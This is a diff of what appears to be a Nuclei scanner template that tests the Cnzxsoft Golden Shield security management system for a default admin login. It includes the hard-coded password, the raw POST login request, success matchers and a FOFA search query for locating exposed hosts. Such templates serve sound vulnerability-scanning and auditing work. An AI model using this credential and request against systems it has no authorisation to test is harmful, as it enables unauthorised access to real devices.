@@ -1,20 +1,30 @@
 id: cnzxsoft-default-login
-
 info:
   name: Cnzxsoft System - Default Login
   author: SleepingBag945
   severity: high
   description: |
-    Cnzxsoft Golden Shield Information Security Management System default login credentials were discovered.
+    Cnzxsoft Golden Shield Information Security Management System has a default weak password.
   metadata:
     runzero-match: any(each(service["html.titles"]), {# matches "(?i)中新金盾信息安全管理系统"})
-    verified: true
+    fofa-query: title=="中新金盾信息安全管理系统"
     max-request: 1
-    fofa-query: 'title=="中新金盾信息安全管理系统"'
-  tags: default-login,cnzxsoft,vuln
-
+    verified: true
+  tags: cnzxsoft,default-login,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    matchers:
+      - condition: and
+        dsl:
+          - status_code == 200
+          - contains(body,"1") && contains(header,"ZXSOFT_JDIS_USR_NAME=deleted") && !contains(body_1,"userpwd_error")
+        type: dsl
+    payloads:
+      password:
+        - zxsoft1234!@#$
+      username:
+        - admin
+    raw:
       - |
         POST /?q=common/login  HTTP/1.1
         Host: {{Hostname}}
@@ -22,17 +32,3 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         name={{username}}&password={{password}}&checkcode=ptbh&doLoginSubmit=1
-
-    payloads:
-      username:
-        - 'admin'
-      password:
-        - 'zxsoft1234!@#$'
-    attack: pitchfork
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 200'
-          - 'contains(body,"1") && contains(header,"ZXSOFT_JDIS_USR_NAME=deleted") && !contains(body_1,"userpwd_error")'
-        condition: and
-
